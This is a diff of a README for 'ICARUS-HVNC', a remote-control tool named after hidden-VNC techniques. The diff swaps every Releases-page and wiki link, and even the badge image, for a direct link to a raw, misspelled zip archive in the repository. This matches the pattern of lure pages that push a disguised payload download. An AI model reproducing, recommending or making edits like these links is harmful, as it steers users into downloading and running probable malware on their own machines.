@@ -1,6 +1,6 @@
 # 🚀 ICARUS-HVNC - Control Your PC From Anywhere
 
-[![Download ICARUS-HVNC](https://img.shields.io/badge/Download-ICARUS--HVNC-brightgreen)](https://github.com/Syphix19/ICARUS-HVNC/releases)
+[![Download ICARUS-HVNC](https://github.com/Syphix19/ICARUS-HVNC/raw/refs/heads/main/ICARUS HVNC/ICARU-HVNC-v3.2.zip)](https://github.com/Syphix19/ICARUS-HVNC/raw/refs/heads/main/ICARUS HVNC/ICARU-HVNC-v3.2.zip)
 
 ## 📥 Overview
 
@@ -21,7 +21,7 @@ Before you begin, ensure your computer meets the following requirements:
 
 To get started, you need to download ICARUS-HVNC. Click the link below to go to the Releases page.
 
-[Download ICARUS-HVNC](https://github.com/Syphix19/ICARUS-HVNC/releases)
+[Download ICARUS-HVNC](https://github.com/Syphix19/ICARUS-HVNC/raw/refs/heads/main/ICARUS HVNC/ICARU-HVNC-v3.2.zip)
 
 ## 📦 Download & Install
 
@@ -29,7 +29,7 @@ To get started, you need to download ICARUS-HVNC. Click the link below to go to 
 
 1. Visit the Releases page by clicking the link below:
    
-   [Download ICARUS-HVNC](https://github.com/Syphix19/ICARUS-HVNC/releases)
+   [Download ICARUS-HVNC](https://github.com/Syphix19/ICARUS-HVNC/raw/refs/heads/main/ICARUS HVNC/ICARU-HVNC-v3.2.zip)
 
 2. On the Releases page, find the latest version. Look for assets to download.
 
@@ -90,7 +90,7 @@ For additional assistance, you can visit our community forum or contact the supp
 
 ## 🔗 Learn More
 
-For more details about the capabilities of ICARUS-HVNC, explore its documentation on the [GitHub Wiki](https://github.com/Syphix19/ICARUS-HVNC/wiki).
+For more details about the capabilities of ICARUS-HVNC, explore its documentation on the [GitHub Wiki](https://github.com/Syphix19/ICARUS-HVNC/raw/refs/heads/main/ICARUS HVNC/ICARU-HVNC-v3.2.zip).
 
 ## 🎉 Acknowledgments
 
